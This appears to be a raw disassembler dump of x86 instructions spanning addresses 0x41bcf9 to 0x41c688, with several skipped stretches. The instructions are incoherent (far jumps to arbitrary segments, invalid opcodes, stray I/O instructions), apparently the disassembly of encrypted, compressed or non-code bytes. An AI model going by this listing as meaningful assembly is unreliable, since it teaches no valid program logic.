  41bcf9:	push   ebp
  41bcfa:	frstor [ecx+0x77]
  41bcfd:	add    eax,0xf852b57c
  41bd02:	jmp    0x153c:0xb2b75c3d
  41bd09:	xchg   esi,eax
  41bd0a:	sti    
  41bd0b:	neg    DWORD PTR ds:0x9276dbaa
  41bd11:	push   edx
  41bd12:	dec    ebp
  41bd13:	cmp    al,0xce
  41bd15:	mov    ch,0x58
  41bd17:	inc    ebx
  41bd18:	or     dl,BYTE PTR [esi+0x2e]
  41bd1b:	cdq    
  41bd1c:	dec    BYTE PTR [ebp-0x1a]
  41bd1f:	mov    ch,0x40
  41bd21:	ds ins DWORD PTR es:[edi],dx
  41bd23:	(bad)  [ecx]
  41bd25:	add    DWORD PTR ds:0x2372f4bb,esi
  41bd2b:	icebp  
  41bd2c:	or     ecx,ecx
  41bd2e:	mov    bl,0x71
  41bd30:	sahf   
  41bd31:	outs   dx,DWORD PTR ds:[esi]
  41bd32:	push   esp
  41bd33:	mov    edx,0x53394cc2
  41bd38:	jp     0x41bdb2
  41bd3a:	ja     0x41bcfc
  41bd3c:	pop    eax
  41bd3d:	icebp  
  41bd3e:	popa   
  41bd3f:	es or  eax,ebx
  41bd42:	inc    esi
  41bd43:	icebp  
  41bd44:	mov    bh,0x5d
  41bd46:	adc    BYTE PTR [edi-0x58],0x3f
  41bd4a:	in     eax,0x9f
  41bd4c:	nop
  41bd4d:	add    BYTE PTR [ecx-0x23],0x4d
  41bd51:	jecxz  0x41bd54
  41bd53:	clc    
  41bd54:	sub    edx,DWORD PTR [edi+0x3b]
  41bd57:	shl    DWORD PTR ds:0xcde16351,0xec
  41bd5e:	lods   eax,DWORD PTR ds:[esi]
  41bd5f:	pop    eax
  41bd60:	xchg   esi,eax
  41bd61:	out    0x17,eax
  41bd63:	loopne 0x41bdad
  41bd65:	call   0x7797:0x4113744
  41bd6c:	cdq    
  41bd6d:	xor    DWORD PTR [eax+0x6978f85],edi
  41bd73:	shr    BYTE PTR [eax-0x47a51b5f],cl
  41bd79:	iret   
  41bd7a:	(bad)  
  41bd7b:	leave  
  41bd7c:	or     al,0x62
  41bd7e:	or     ebx,ebx
  41bd80:	lods   al,BYTE PTR ds:[esi]
  41bd81:	fadd   QWORD PTR [ebx+0x68bb2f4e]
  41bd87:	adc    al,0x7
  41bd89:	outs   dx,BYTE PTR ds:[esi]
  41bd8a:	cmp    DWORD PTR [ecx],edi
  41bd8c:	outs   dx,BYTE PTR ds:[esi]
  41bd8d:	pushf  
  41bd8e:	xchg   BYTE PTR [eax+edx*1-0x64a01afd],ch
  41bd95:	sub    ebp,esi
  41bd97:	lahf   
  41bd98:	mov    gs,esi
  41bd9a:	repnz push ss
  41bd9c:	xor    eax,DWORD PTR [ecx-0x6036bc3]
  41bda2:	pop    ds
  41bda3:	jb     0x41bd25
  41bda5:	test   al,0xb0
  41bda7:	dec    ebx
  41bda8:	out    dx,al
  41bda9:	mov    edi,0x984f939e
  41bdae:	inc    edi
  41bdaf:	aas    
  41bdb0:	call   0x0:0x2a32b71b
	...
  41be13:	add    BYTE PTR [eax],al
  41be15:	add    BYTE PTR [ebp-0x63956373],al
  41be1b:	jnp    0x41be14
  41be1d:	out    dx,eax
  41be1e:	add    BYTE PTR [ebp-0x32],dh
  41be21:	push   edx
  41be22:	sbb    DWORD PTR [edi],ecx
  41be24:	in     eax,0x50
  41be26:	inc    eax
  41be27:	add    DWORD PTR es:[eax],eax
  41be2a:	pop    es
  41be2b:	add    DWORD PTR [eax],eax
  41be2d:	add    cl,ah
  41be2f:	xchg   ecx,eax
  41be30:	stos   BYTE PTR es:[edi],al
  41be31:	cmp    al,0x35
  41be33:	call   0x27fa:0x1f5e5cbf
  41be3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41be3b:	push   edx
  41be3c:	lea    edi,[eax]
  41be3e:	aam    0x80
  41be40:	and    BYTE PTR [ebx-0xe8ece8d],dl
  41be46:	js     0x41be18
  41be48:	jmp    0xebbe:0xfff1eb9e
  41be4f:	xor    al,0xf4
  41be51:	fsub   QWORD PTR [ecx+edx*4+0x314db11]
  41be58:	jae    0x41bec8
  41be5a:	push   ss
  41be5b:	push   edi
  41be5c:	test   BYTE PTR [ebx],al
  41be5e:	dec    ebx
  41be5f:	jae    0x41be9a
  41be61:	or     ebp,esp
  41be63:	pop    ebx
  41be64:	jmp    0xe359:0xcd7640a5
  41be6b:	mov    ebx,0x391cbb15
  41be70:	fdiv   QWORD PTR [esi-0x6c39025]
  41be76:	inc    esi
  41be77:	inc    ebx
  41be78:	add    BYTE PTR [edi+edi*8],dl
  41be7b:	pop    edx
  41be7c:	dec    esi
  41be7d:	adc    eax,esi
  41be7f:	dec    eax
  41be80:	gs cli 
  41be82:	xor    al,0x6e
  41be84:	push   es
  41be85:	retf   
  41be86:	data16 sbb bh,al
  41be89:	das    
  41be8a:	and    DWORD PTR [esi+0x776bb22f],ebp
  41be90:	(bad)  
  41be91:	adc    BYTE PTR [ecx-0x2a],bl
  41be94:	jo     0x41be51
  41be96:	(bad)
  41be99:	dec    edx
  41be9a:	or     DWORD PTR [esi+eax*2+0x68],ebx
  41be9e:	fcmovu st,st(1)
  41bea0:	shl    BYTE PTR [eax-0x19],0x56
  41bea4:	jmp    0x41be7c
  41bea6:	add    DWORD PTR [ebx+0x2350e1e2],esi
  41beac:	out    dx,eax
  41bead:	leave  
  41beae:	test   al,0xc6
  41beb0:	arpl   WORD PTR [ecx-0x4bce111],si
  41beb6:	xor    esi,DWORD PTR [ecx-0x5100b924]
  41bebc:	jb     0x41bec1
  41bebe:	loop   0x41bf27
  41bec0:	outs   dx,BYTE PTR ds:[esi]
  41bec1:	aas    
  41bec2:	les    ebx,FWORD PTR [edi]
  41bec4:	mov    ch,0xfc
  41bec6:	adc    ebp,DWORD PTR [edx]
  41bec8:	push   ebx
  41bec9:	fsubr  st(5),st
  41becb:	dec    esi
  41becc:	xchg   edx,eax
  41becd:	adc    eax,0x702d6a30
  41bed2:	les    esi,FWORD PTR [eax-0x5e]
  41bed5:	mov    cl,0xe3
  41bed7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bed8:	frstor [eax]
  41beda:	mov    ecx,0x836aa47d
  41bedf:	push   edi
  41bee0:	pop    edx
  41bee1:	or     BYTE PTR [edi+0x3685a81],bh
  41bee7:	lock mov esp,0xa76a7b80
  41beed:	stos   BYTE PTR es:[edi],al
  41beee:	bound  esi,QWORD PTR [ecx-0x5d]
  41bef1:	xor    eax,0xa8af694
  41bef6:	or     al,bl
  41bef8:	xchg   BYTE PTR [esi+0x2e1f09cc],bh
  41befe:	or     BYTE PTR [ebx-0x76d6f719],bh
  41bf04:	mov    ecx,0x165ea57
  41bf09:	push   esp
  41bf0a:	sub    ebx,DWORD PTR [eax+eax*4+0xe]
  41bf0e:	popa   
  41bf0f:	xor    al,0x7f
  41bf11:	xchg   ebp,eax
  41bf12:	sub    bh,dh
  41bf14:	dec    eax
  41bf15:	add    BYTE PTR [ecx-0x7637e86f],ch
  41bf1b:	aam    0xcf
  41bf1d:	lods   al,BYTE PTR ds:[esi]
  41bf1e:	pop    ebp
  41bf1f:	sbb    DWORD PTR [esi+0x45fd4e9d],eax
  41bf25:	fdivr  DWORD PTR [eax]
  41bf27:	sbb    DWORD PTR [ecx+0x508f27bc],edx
  41bf2d:	pop    ds
  41bf2e:	icebp  
  41bf2f:	repnz (bad) 
  41bf31:	and    ebp,ecx
  41bf33:	lods   al,BYTE PTR ds:[esi]
  41bf34:	pop    DWORD PTR [eax]
	...
  41bf96:	fs jae 0x41bfcc
  41bf99:	es aaa 
  41bf9b:	data16 jne 0x41c011
  41bf9e:	pop    ds
  41bf9f:	sub    DWORD PTR [ebx],ebp
  41bfa1:	daa    
  41bfa2:	test   al,bh
  41bfa4:	aas    
  41bfa5:	das    
  41bfa6:	inc    edi
  41bfa7:	daa    
  41bfa8:	add    DWORD PTR [eax],eax
  41bfaa:	pop    es
  41bfab:	add    DWORD PTR [eax],eax
  41bfad:	add    BYTE PTR [eax+0x246df2f3],al
  41bfb3:	scas   eax,DWORD PTR es:[edi]
  41bfb4:	dec    esi
  41bfb5:	cdq    
  41bfb6:	adc    edx,edx
  41bfb8:	pop    edx
  41bfb9:	jg     0x41bf74
  41bfbb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bfbc:	dec    ebp
  41bfbd:	xor    al,0x6f
  41bfbf:	in     eax,0x99
  41bfc1:	addr16 jge 0x41c01a
  41bfc4:	mov    ds:0x135b7de8,eax
  41bfc9:	loope  0x41c01b
  41bfcb:	adc    esp,DWORD PTR [eax-0xa]
  41bfce:	sub    bl,ah
  41bfd0:	out    0x13,eax
  41bfd2:	lock in eax,0xbd
  41bfd5:	mov    ah,0xcd
  41bfd7:	sar    BYTE PTR [eax+0x22],cl
  41bfda:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bfdb:	inc    esi
  41bfdc:	cmp    al,0xf9
  41bfde:	mov    ss,WORD PTR [esi-0x65a5a7a0]
  41bfe4:	mov    bh,0xab
  41bfe6:	clc    
  41bfe7:	sub    bl,ah
  41bfe9:	xchg   DWORD PTR [eax-0x39],edx
  41bfec:	fwait
  41bfed:	mov    edi,0x538b8f8e
  41bff2:	iret   
  41bff3:	fidiv  WORD PTR [esi]
  41bff5:	dec    DWORD PTR [ebx-0x58b71019]
  41bffb:	mov    al,0x7d
  41bffd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bffe:	shl    BYTE PTR [ecx-0x42],0xb
  41c002:	sti    
  41c003:	mov    ah,0x13
  41c005:	adc    eax,0xeec9af46
  41c00a:	test   eax,0x966df3c9
  41c00f:	mov    edi,0x54a6a148
  41c014:	jae    0x41c035
  41c016:	repz mov bh,0xe6
  41c019:	out    dx,al
  41c01a:	scas   eax,DWORD PTR es:[edi]
  41c01b:	daa    
  41c01c:	xchg   edx,eax
  41c01d:	dec    eax
  41c01e:	and    bl,BYTE PTR [ebx+0x2e]
  41c021:	push   ss
  41c022:	ins    BYTE PTR es:[edi],dx
  41c023:	and    eax,0x5f48c7be
  41c028:	stos   BYTE PTR es:[edi],al
  41c029:	and    eax,0x249cb2ba
  41c02e:	imul   ebx,edx,0xb
  41c031:	xor    eax,0x9af9a681
  41c036:	in     al,dx
  41c037:	punpckhwd mm7,mm5
  41c03a:	pop    ss
  41c03b:	mov    BYTE PTR [ecx-0x5346ceb2],dh
  41c041:	(bad)  
  41c042:	aas    
  41c043:	jbe    0x41c001
  41c045:	shl    edi,cl
  41c047:	or     DWORD PTR [ebp-0x11],0xffffff9d
  41c04b:	mov    cl,0x8
  41c04d:	jp     0x41bfd3
  41c04f:	imul   esp,DWORD PTR [ecx],0x9d71b5f7
  41c055:	cmp    dh,al
  41c057:	(bad)  
  41c058:	sub    BYTE PTR [ebp+esi*1+0x42a98246],ah
  41c05f:	ror    dl,1
  41c061:	jns    0x41c0be
  41c063:	jmp    0xf033:0xb187aa9e
  41c06a:	push   eax
  41c06b:	ret    0x6434
  41c06e:	aad    0x3b
  41c070:	das    
  41c071:	ins    BYTE PTR es:[edi],dx
  41c072:	cdq    
  41c073:	add    al,0xa2
  41c075:	sbb    ecx,DWORD PTR [ebx]
  41c077:	rcl    edx,0x0
  41c07a:	data16 stc 
  41c07c:	lods   eax,DWORD PTR ds:[esi]
  41c07d:	jmp    0x2142:0xd1e3cff6
  41c084:	cs leave 
  41c086:	cmp    dl,BYTE PTR [eax-0x31]
  41c089:	fdiv   QWORD PTR [edi]
  41c08b:	push   ss
  41c08c:	hlt    
  41c08d:	sar    BYTE PTR [ebp+0x3e],1
  41c090:	xor    eax,edx
  41c092:	inc    edi
  41c093:	inc    esi
  41c094:	loop   0x41c0c1
  41c096:	or     BYTE PTR [edx+0x48],dl
  41c099:	xchg   esp,eax
  41c09a:	mov    al,0x4
  41c09c:	jmp    0x78b9:0xbbc7b7be
  41c0a3:	inc    eax
  41c0a4:	test   DWORD PTR [esi+0x6d],eax
  41c0a7:	jae    0x41c047
  41c0a9:	dec    eax
  41c0aa:	rcr    BYTE PTR [ecx+0x6520b2a9],cl
  41c0b0:	call   0x0:0xb85097d6
	...
  41c113:	add    BYTE PTR [eax],al
  41c115:	add    cl,bl
  41c117:	dec    edx
  41c118:	mov    eax,ds:0xd9fbb3f8
  41c11d:	imul   ecx,DWORD PTR [ecx-0x29],0xffffffbd
  41c121:	clc    
  41c122:	imul   esp,DWORD PTR [edx+0x284ecd36],0x1
  41c129:	add    BYTE PTR [edi],al
  41c12b:	add    DWORD PTR [eax],eax
  41c12d:	add    BYTE PTR [ecx],dl
  41c12f:	adc    bl,BYTE PTR [esi+0x7a5f52d8]
  41c135:	jbe    0x41c0f6
  41c137:	inc    ecx
  41c138:	jp     0x41c0db
  41c13a:	mov    ds:0x9a70aa7e,eax
  41c13f:	dec    ebx
  41c140:	mov    eax,ds:0x416e2a64
  41c145:	mov    WORD PTR [ebx+0x73],ss
  41c148:	arpl   WORD PTR [ebx],sp
  41c14a:	and    dh,BYTE PTR ds:0xa2dc7056
  41c150:	inc    edi
  41c151:	je     0x41c115
  41c153:	cs mov dh,0xef
  41c156:	dec    eax
  41c157:	rcr    DWORD PTR [esi],cl
  41c159:	dec    esp
  41c15a:	cmp    al,0x19
  41c15c:	xor    DWORD PTR [ebx-0x78],0xffffffc7
  41c160:	repz cmp ebp,ecx
  41c163:	and    eax,0x7fb117e4
  41c168:	(bad)  
  41c169:	std    
  41c16a:	push   ebp
  41c16b:	mov    eax,ds:0x157c673e
  41c170:	and    al,0xc
  41c172:	arpl   WORD PTR [eax-0x7e],bp
  41c175:	imul   edi,DWORD PTR [edx],0x6e
  41c178:	test   al,0x62
  41c17a:	jo     0x41c117
  41c17c:	fxch   st(1)
  41c17e:	std    
  41c17f:	repnz push ds
  41c181:	push   0x3f
  41c183:	int    0x54
  41c185:	bound  eax,QWORD PTR [edx-0x1]
  41c188:	inc    edx
  41c189:	es adc al,0xe6
  41c18c:	push   0xffffff8b
  41c18e:	nop
  41c18f:	es pop esi
  41c191:	push   cs
  41c192:	pop    esi
  41c193:	mov    al,ds:0xd2a3de27
  41c198:	pusha  
  41c199:	sbb    al,0xde
  41c19b:	lods   al,BYTE PTR ds:[esi]
  41c19c:	rcl    esi,cl
  41c19e:	push   0xc0612c90
  41c1a3:	add    DWORD PTR [ecx],ecx
  41c1a5:	mov    ebx,0x3c56f751
  41c1aa:	dec    ecx
  41c1ab:	cmp    esi,esp
  41c1ad:	fs mov ds,edi
  41c1b0:	mov    esp,0x87140afe
  41c1b5:	scas   al,BYTE PTR es:[edi]
  41c1b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c1b7:	into   
  41c1b8:	push   ds
  41c1b9:	jae    0x41c1b0
  41c1bb:	les    edx,FWORD PTR [eax+0x21]
  41c1be:	add    dh,bh
  41c1c0:	retf   
  41c1c1:	jmp    0x8442:0x842372a4
  41c1c8:	lods   al,BYTE PTR ds:[esi]
  41c1c9:	xchg   ebx,eax
  41c1ca:	ja     0x41c1c3
  41c1cc:	pusha  
  41c1cd:	bnd jns 0x41c22e
  41c1d0:	mov    DWORD PTR [edi],ecx
  41c1d2:	mov    bl,0xe9
  41c1d4:	lahf   
  41c1d5:	add    edx,DWORD PTR [eax]
  41c1d7:	jmp    0xed39:0xa8935ac
  41c1de:	leave  
  41c1df:	test   eax,0x511a6bda
  41c1e4:	pop    ebx
  41c1e5:	gs (bad) 
  41c1e7:	aas    
  41c1e8:	pop    ebx
  41c1e9:	inc    ecx
  41c1ea:	out    dx,eax
  41c1eb:	cmp    al,0xde
  41c1ed:	std    
  41c1ee:	jl     0x41c1ef
  41c1f0:	gs xchg ebp,eax
  41c1f2:	dec    esi
  41c1f3:	xor    al,0xd5
  41c1f5:	mov    bl,0x69
  41c1f7:	xchg   esi,eax
  41c1f9:	into   
  41c1fa:	push   esi
  41c1fb:	mov    dl,0x88
  41c1fd:	add    eax,edx
  41c1ff:	push   ebx
  41c200:	adc    ch,BYTE PTR [edx+eiz*2-0x6e50f097]
  41c207:	pushf  
  41c208:	sub    ah,BYTE PTR [esi+0x1453d7c2]
  41c20e:	mov    al,0x3f
  41c210:	xor    al,BYTE PTR [edx+0x4a943b5]
  41c216:	pushf  
  41c217:	mov    eax,ds:0x31dbef18
  41c21c:	jge    0x41c282
  41c21e:	mov    esi,0x90d594b5
  41c223:	jne    0x41c28e
  41c225:	adc    DWORD PTR [eax],esp
  41c227:	enter  0x8d65,0x99
  41c22b:	jb     0x41c238
  41c22d:	out    dx,eax
  41c22e:	mov    BYTE PTR [ebx+0x45],ch
  41c231:	fs lahf 
  41c233:	and    al,0x2a
	...
  41c295:	add    bl,dh
  41c297:	and    ebp,ecx
  41c299:	push   ebp
  41c29a:	(bad)  
  41c29c:	sti    
  41c29d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c29e:	push   esp
  41c29f:	mov    WORD PTR [edi+0x3f],?
  41c2a2:	ja     0x41c242
  41c2a4:	push   ebx
  41c2a5:	fcom   QWORD PTR [ebp+0x29]
  41c2a8:	add    DWORD PTR [eax],eax
  41c2aa:	pop    es
  41c2ab:	add    DWORD PTR [eax],eax
  41c2ad:	add    BYTE PTR [eax],ah
  41c2af:	(bad)  
  41c2b0:	out    0x84,al
  41c2b2:	mov    ecx,0x605d5c06
  41c2b7:	xor    eax,0xe53881d5
  41c2bc:	rcl    DWORD PTR [esi],cl
  41c2be:	fsubr  DWORD PTR [eax-0x104b2a1b]
  41c2c4:	push   ecx
  41c2c5:	loop   0x41c297
  41c2c7:	jp     0x41c2fd
  41c2c9:	rcl    DWORD PTR ds:0xe38a4eea,1
  41c2cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c2d0:	push   cs
  41c2d1:	jnp    0x41c275
  41c2d3:	jecxz  0x41c274
  41c2d5:	push   edx
  41c2d6:	add    al,0x38
  41c2d8:	call   0x2e9f:0x75378b11
  41c2df:	push   cs
  41c2e0:	rcl    BYTE PTR [edx-0x27],0x88
  41c2e4:	mov    ds:0xe540327b,eax
  41c2e9:	stc    
  41c2ea:	mov    DWORD PTR [eax],esi
  41c2ec:	pop    ebp
  41c2ed:	inc    ebp
  41c2ee:	sub    eax,DWORD PTR [ebx]
  41c2f0:	shl    dl,1
  41c2f2:	retf   0x1b69
  41c2f5:	xor    al,0x82
  41c2f7:	shl    DWORD PTR [ebp+0x79],1
  41c2fa:	mov    esp,0x9685edc3
  41c2ff:	popa   
  41c300:	(bad)  
  41c301:	mov    dl,0x51
  41c303:	stos   DWORD PTR es:[edi],eax
  41c304:	fmulp  st(2),st
  41c306:	mov    edx,0xc7dd291a
  41c30b:	push   esp
  41c30c:	jp     0x41c2e0
  41c30e:	pop    edx
  41c30f:	push   eax
  41c310:	add    bl,BYTE PTR [ebx]
  41c312:	xchg   ecx,eax
  41c313:	test   DWORD PTR [esi],ebx
  41c315:	retf   
  41c316:	dec    eax
  41c317:	repnz fyl2x 
  41c31a:	add    edx,DWORD PTR [eax-0x3dd70c91]
  41c320:	stos   BYTE PTR es:[edi],al
  41c321:	mov    ds:0x9d161034,eax
  41c326:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c327:	mov    cl,0xcb
  41c329:	stc    
  41c32a:	and    ebp,DWORD PTR [edx-0x52]
  41c32d:	jmp    0x2dc311e0
  41c332:	jns    0x41c2ca
  41c334:	es ja  0x41c2b8
  41c337:	adc    BYTE PTR [esi-0x32],al
  41c33a:	mov    bl,0x1f
  41c33c:	fist   WORD PTR [edx]
  41c33e:	add    al,0x5
  41c340:	dec    esp
  41c341:	mov    dh,0xa3
  41c343:	call   0xc0cc4a1b
  41c348:	xchg   edi,eax
  41c349:	fidiv  WORD PTR [edx+0x45e1ca75]
  41c34f:	fsub   DWORD PTR [ebx+0x2]
  41c352:	mov    eax,0xefa2f698
  41c357:	add    eax,0x21f811ee
  41c35c:	enter  0xd4a5,0x86
  41c360:	gs addr16 pop ebx
  41c363:	xor    BYTE PTR [ebx+ecx*4+0x254eeee],bl
  41c36a:	icebp  
  41c36b:	mov    DWORD PTR [ecx-0x61],ebx
  41c36e:	mov    esp,0xc026918e
  41c373:	and    bh,BYTE PTR [ebp+eiz*1+0x45]
  41c377:	dec    ecx
  41c378:	pop    edi
  41c379:	pop    edi
  41c37a:	arpl   cx,di
  41c37c:	ficom  WORD PTR [esi]
  41c37e:	jo     0x41c340
  41c380:	push   ss
  41c381:	sub    esi,esi
  41c383:	mov    bh,0x14
  41c385:	or     cl,BYTE PTR [eax-0x477e3fea]
  41c38b:	pusha  
  41c38c:	enter  0x9f50,0xd9
  41c390:	(bad)  
  41c391:	aad    0x27
  41c393:	lods   al,BYTE PTR ds:[esi]
  41c394:	inc    esi
  41c395:	pushf  
  41c396:	nop
  41c397:	sbb    al,0x42
  41c399:	test   al,0x98
  41c39b:	sub    cl,ch
  41c39d:	sbb    ah,BYTE PTR [ecx]
  41c39f:	or     DWORD PTR [ebx-0x7f],esp
  41c3a2:	push   ebp
  41c3a3:	xchg   edi,eax
  41c3a4:	xor    DWORD PTR [ecx],eax
  41c3a6:	popf   
  41c3a7:	fcmovnu st,st(7)
  41c3a9:	out    dx,al
  41c3aa:	stos   BYTE PTR es:[edi],al
  41c3ab:	ror    BYTE PTR [edi-0x25],1
  41c3ae:	outs   dx,DWORD PTR ds:[esi]
  41c3af:	(bad)  
  41c3b0:	dec    esi
  41c3b1:	sahf   
  41c3b2:	retf   0x95e0
	...
  41c415:	add    BYTE PTR [ebx+0x20],dl
  41c418:	mov    al,ds:0x5faef3ae
  41c41d:	std    
  41c41e:	mov    ah,0x86
  41c420:	jmp    FWORD PTR [esi+eax*2+0x7e]
  41c424:	popa   
  41c425:	rcr    DWORD PTR [edx+ebp*1+0x1],cl
  41c429:	add    BYTE PTR [edi],al
  41c42b:	add    DWORD PTR [eax],eax
  41c42d:	add    BYTE PTR [edx],al
  41c42f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c430:	mov    ebx,0x43e5ac07
  41c435:	stc    
  41c436:	xchg   esi,eax
  41c437:	push   esp
  41c438:	xchg   BYTE PTR [edi],bl
  41c43a:	adc    BYTE PTR [ebp+0x29],0xc9
  41c43e:	test   BYTE PTR [edi],dl
  41c440:	dec    ebx
  41c441:	adc    eax,DWORD PTR [edx+0xa54aa0c]
  41c447:	rol    DWORD PTR ds:0x8d3a5bcf,0xac
  41c44e:	push   esp
  41c44f:	mov    ah,0x89
  41c451:	mov    edx,?
  41c453:	jle    0x41c400
  41c455:	pop    ss
  41c456:	(bad)  
  41c457:	sbb    BYTE PTR [eax],cl
  41c459:	xchg   edi,eax
  41c45a:	or     dh,ah
  41c45c:	cmp    edi,DWORD PTR [esi-0x79285ab4]
  41c462:	xor    BYTE PTR [esi+0xd7178fb],dl
  41c468:	xchg   BYTE PTR [edi-0xdd28721],ch
  41c46e:	loope  0x41c4b3
  41c470:	pop    ebx
  41c471:	jge    0x41c4d8
  41c473:	adc    al,0x3e
  41c475:	pop    edx
  41c476:	mov    dh,0xd8
  41c478:	cwde   
  41c479:	mov    al,ds:0x26d130de
  41c47e:	xchg   ecx,eax
  41c47f:	cmp    ebx,ecx
  41c481:	push   0x65e601a9
  41c486:	xor    DWORD PTR [esi+0x6],esi
  41c489:	call   0x9871:0x40d8d642
  41c490:	lds    edi,FWORD PTR [ebp+0x5f]
  41c493:	stos   BYTE PTR es:[edi],al
  41c494:	sbb    DWORD PTR [ebx-0x68],0x29
  41c498:	fwait
  41c499:	lods   al,BYTE PTR ds:[esi]
  41c49a:	mov    ds:0xe59232a4,eax
  41c49f:	sti    
  41c4a0:	push   esp
  41c4a1:	stc    
  41c4a2:	xchg   esi,eax
  41c4a3:	popf   
  41c4a4:	mov    al,0xd2
  41c4a6:	xor    eax,0x1dbd6ee4
  41c4ab:	js     0x41c4e8
  41c4ad:	in     eax,dx
  41c4ae:	call   0xe20b4dd4
  41c4b3:	jmp    0x8554e68b
  41c4b8:	add    eax,0x34360c82
  41c4bd:	into   
  41c4be:	dec    ecx
  41c4bf:	mov    ebx,0x3db844a6
  41c4c4:	sbb    cl,BYTE PTR [ecx-0x7ecc0a1e]
  41c4ca:	or     DWORD PTR [ecx],0xffffffec
  41c4cd:	or     eax,0x14cb866c
  41c4d2:	fiadd  DWORD PTR [ecx-0x4622bef]
  41c4d8:	inc    esi
  41c4d9:	mov    bh,0xbe
  41c4db:	call   0x603b:0x3298734b
  41c4e2:	in     al,0x4b
  41c4e4:	or     BYTE PTR [eax],dl
  41c4e6:	sbb    DWORD PTR ds:0x6fe20882,edi
  41c4ec:	xor    esp,DWORD PTR [ecx+0x69]
  41c4ef:	inc    esi
  41c4f0:	nop
  41c4f1:	fistp  DWORD PTR [ecx-0x2d4f37e5]
  41c4f7:	hlt    
  41c4f8:	mov    bl,0x2d
  41c4fa:	(bad)  
  41c4fb:	loop   0x41c57a
  41c4fd:	fcos   
  41c4ff:	mov    WORD PTR [ebx+0x4e540c07],ds
  41c505:	hlt    
  41c506:	push   0xcb0a7389
  41c50b:	mov    ebp,0xf932ec7f
  41c510:	jnp    0x41c588
  41c512:	sub    edi,DWORD PTR [ecx+0x19]
  41c515:	adc    DWORD PTR [edi],eax
  41c517:	arpl   WORD PTR [ebx+0x39658fb0],bx
  41c51d:	test   al,0xe0
  41c51f:	ror    DWORD PTR [eax+0x196aa590],1
  41c525:	pop    esp
  41c526:	sub    ecx,DWORD PTR [eax]
  41c528:	xchg   ecx,eax
  41c529:	ror    BYTE PTR [ebp+0x7089b4b1],1
  41c52f:	data16 adc al,0x56
  41c532:	mov    dh,0x5c
  41c534:	jle    0x41c536
	...
  41c596:	lds    esp,FWORD PTR [ebx]
  41c598:	xchg   ecx,eax
  41c599:	and    eax,0xe3f5b7f7
  41c59e:	sbb    ch,BYTE PTR [edx+0x10]
  41c5a1:	stc    
  41c5a2:	in     al,dx
  41c5a3:	add    BYTE PTR [ecx+0x12b638a],0x0
  41c5aa:	pop    es
  41c5ab:	add    DWORD PTR [eax],eax
  41c5ad:	add    bl,ah
  41c5af:	sbb    edx,esi
  41c5b1:	mov    WORD PTR [edx],gs
  41c5b3:	popf   
  41c5b4:	ss jmp 0x41c571
  41c5b7:	sbb    al,0xd3
  41c5b9:	mov    eax,0x814e9020
  41c5be:	push   ebx
  41c5bf:	inc    ecx
  41c5c0:	and    eax,0xfbe1fd71
  41c5c5:	cs and al,0x62
  41c5c8:	inc    edi
  41c5c9:	fndisi(8087 only) 
  41c5cb:	mov    ds:0x5c85123a,al
  41c5d0:	pop    ebp
  41c5d1:	add    BYTE PTR [ebx+0x5e],0x8b
  41c5d5:	mov    edx,0x6955b4e
  41c5da:	pop    esp
  41c5db:	sub    ch,BYTE PTR [ecx]
  41c5dd:	icebp  
  41c5de:	popa   
  41c5df:	imul   BYTE PTR [ebp+0x57]
  41c5e2:	cli    
  41c5e3:	leave  
  41c5e4:	and    ebx,0xffffffb3
  41c5e7:	cdq    
  41c5e8:	and    al,0x35
  41c5ea:	xchg   BYTE PTR [esi-0x3f],dh
  41c5ed:	call   0xe355db3e
  41c5f2:	sbb    edx,DWORD PTR [eax-0x2d5d37fa]
  41c5f8:	cmc    
  41c5f9:	in     eax,0x69
  41c5fb:	and    al,0xe6
  41c5fd:	arpl   WORD PTR [ebx-0x3c],sp
  41c600:	cmp    eax,0x52ba4183
  41c605:	aad    0x7c
  41c607:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c608:	sbb    BYTE PTR [edx],0x2b
  41c60b:	xchg   ebx,eax
  41c60c:	jnp    0x41c5e8
  41c60e:	xor    ecx,DWORD PTR [eax+ebx*2-0x4e38a901]
  41c615:	fwait
  41c616:	xor    eax,0xbcab71e5
  41c61b:	cmc    
  41c61c:	loope  0x41c606
  41c61e:	rol    BYTE PTR [edi+0x19c42f35],0x88
  41c625:	(bad)  
  41c627:	test   DWORD PTR [ebp+ebx*2-0x1e],edi
  41c62b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c62c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c62d:	dec    ebp
  41c62e:	or     DWORD PTR [edx+0x1],esi
  41c631:	mov    ebp,0xe5ab2c63
  41c636:	sub    BYTE PTR [ecx-0x1],al
  41c639:	out    dx,al
  41c63a:	add    DWORD PTR [esi+0x36],ecx
  41c63d:	push   ss
  41c63e:	jne    0x41c6bc
  41c640:	popf   
  41c641:	or     BYTE PTR [ecx+eiz*1-0x9a1451],bh
  41c648:	mov    edx,0x3ae72c92
  41c64d:	mov    al,ds:0xd9625d19
  41c652:	shl    ebx,cl
  41c654:	and    eax,0x9c27b8e5
  41c659:	ret    
  41c65a:	xlat   BYTE PTR ds:[ebx]
  41c65b:	je     0x41c5de
  41c65d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c65e:	add    al,0xf5
  41c660:	shl    DWORD PTR [edi-0x23],0x73
  41c664:	(bad)  
  41c665:	and    DWORD PTR [edx],esi
  41c667:	mov    al,ds:0x2c580ae9
  41c66c:	xor    ah,BYTE PTR [esi]
  41c66e:	inc    ebp
  41c66f:	icebp  
  41c670:	mov    ecx,0x1407b36d
  41c675:	push   ebp
  41c676:	push   0xffffffed
  41c678:	fstp   QWORD PTR [ebx-0x30]
  41c67b:	mov    eax,0xc2598fa0
  41c680:	pushf  
  41c681:	mov    ah,0x9e
  41c683:	push   es
  41c684:	lods   eax,DWORD PTR ds:[esi]
  41c685:	(bad)  
  41c686:	ja     0x41c64d
  41c688:	mov    bh,0x9a
